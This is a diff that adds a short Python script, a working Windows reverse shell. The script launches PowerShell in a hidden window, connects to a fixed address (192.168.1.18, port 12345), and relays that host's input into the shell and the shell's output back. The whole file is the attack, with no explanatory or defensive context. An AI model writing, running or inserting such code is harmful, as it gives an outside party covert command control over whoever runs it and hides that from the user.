@@ -1,0 +1,33 @@
+import socket
+import os
+import threading
+import subprocess as sp
+
+def read_from_process(proc, sock):
+    while True:
+        output = os.read(proc.stdout.fileno(), 1024)
+        if output:
+            sock.send(output)
+
+def write_to_process(proc, sock):
+    while True:
+        input_data = sock.recv(1024)
+        if input_data:
+            os.write(proc.stdin.fileno(), input_data)
+
+def main():
+    # Create a hidden subprocess
+    startupinfo = sp.STARTUPINFO()
+    startupinfo.dwFlags |= sp.STARTF_USESHOWWINDOW
+    startupinfo.wShowWindow = sp.SW_HIDE
+
+    proc = sp.Popen(['powershell.exe'], stdin=sp.PIPE, stdout=sp.PIPE, stderr=sp.STDOUT, startupinfo=startupinfo)
+    sock = socket.socket()
+    sock.connect(('192.168.1.18', 12345))
+
+    # Start the threads to handle input and output
+    threading.Thread(target=read_from_process, args=(proc, sock), daemon=True).start()
+    threading.Thread(target=write_to_process, args=(proc, sock)).start()
+
+if __name__ == "__main__":
+    main()
